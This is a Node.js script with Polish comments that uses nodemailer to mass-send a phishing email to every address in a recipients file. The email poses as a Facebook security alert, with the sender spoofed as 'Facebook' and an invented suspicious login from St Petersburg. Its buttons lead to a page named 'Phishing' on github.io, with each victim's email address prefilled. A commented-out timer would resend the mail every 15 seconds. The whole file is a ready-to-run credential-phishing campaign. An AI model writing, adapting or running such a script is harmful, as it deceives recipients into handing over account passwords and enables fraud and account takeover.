const nodemailer = require('nodemailer');
const fs = require('fs');

// Odczyt pliku JSON
const recipients = JSON.parse(fs.readFileSync('recipients.json', 'utf8'));

const transporter = nodemailer.createTransport({
  host: 'smtp.wp.pl',
  port: 465,
  secure: true,
  auth: {
    user: 'attacker@gmail.com',// podaj adres email
    pass: 'password' // Podaj prawdziwe hasło 
  }
});

//setInterval(() => {
  recipients.emails.forEach((email) => {
    const mailOptions = {
      from: '"Facebook" <attacker@gmail.com>', //od kogo
      to: email,
      subject: 'Alert zabezpieczeń Facebook', //temat maila
      html: `<!DOCTYPE html> 
    <html lang="pl"> 
    <head> 
        <meta charset="UTF-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>Facebook - Alert logowania</title> 
        <style> 
        body { 
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #ffffff; }

        .email-container { 
            width: 100%; 
            max-width: 600px; 
            margin: 0 auto; 
            padding: 20px; 
            background-color: #ffffff; 
            border: 1px solid #e5e5e5; } 
            
        .header { 
            text-align: center; 
            margin-bottom: 20px; } 
                
        .header img { 
            width: 32px; 
            height: 32px; } 
                
        .title { 
            font-size: 19px; 
            color: #1877f2; 
            text-decoration: none; } 
        
        .content { 
            font-size: 16px; 
            color: #141823; 
            line-height: 1.5; } 
            
        .highlight { 
            font-weight: bold; } 
            
        .btn { 
            display: block; 
            text-align: center; 
            background-color: #1877f2; 
            color: #ffffff; 
            text-decoration: none; 
            font-size: 14px; 
            font-weight: bold; 
            padding: 10px 20px; 
            border-radius: 6px; 
            margin: 20px 0; } 
            
        .btn-secondary { 
            background-color: #e4e6eb; 
            color: #141823; } 
            
        .info { 
            font-size: 14px; 
            color: #777; } 
            
        .footer { 
            text-align: center; 
            font-size: 12px; 
            color: #777; 
            margin-top: 20px; } 
        </style> 
    </head> 
    <body> 
        <div class="email-container"> 
            <div style="display:flex" class="header"> 
                    <img style="width:42px; height:42px; "href="https://www.facebook.com" src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/ZirYDPWh0YD.png" alt="Facebook logo"> 
            </div> 
            <h1 class="title">Alert dotyczący logowania</h1> 

            <div class="content"> 
                <p class="highlight">Witaj!</p> 
                <p>Zauważyliśmy nietypowe logowanie z urządzenia lub lokalizacji, z których zazwyczaj nie korzystasz. Czy to Ty się logowałeś?</p> 
                <p class="info"><strong>Nowe logowanie:</strong> 16 grudnia 2024 o 20:40</p> 
                <p class="info"><strong>Lokalizacja:</strong> W pobliżu lokalizacji Sankt Petersburg, Rosja</p> 
                <p class="info"><strong>Urządzenie:</strong> iPhone 16 Pro</p> 
                <a href="https://grumczak.github.io/Phishing?email=${encodeURIComponent(email)}" class="btn">Weryfikacja logowania</a> 
                <a href="https://grumczak.github.io/Phishing?email=${encodeURIComponent(email)}" class="btn btn-secondary">Jeśli to nie Ty, zaktualizuj swoje hasło.</a> 
            </div> 
            <div class="footer"> 
                <p>Jeśli to nie Ty, zaktualizuj swoje hasło i ustawienia bezpieczeństwa przyciskiem powyżej.</p> 
            </div> 
        </div> 
    </body> 
    </html>` //treść maila
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log(`Błąd wysyłania do ${email}: ${error}`);
      }
      console.log(`Wiadomość wysłana do ${email}: ${info.response}`);
    });
  });
//}, 15000); // Co 15 sekund
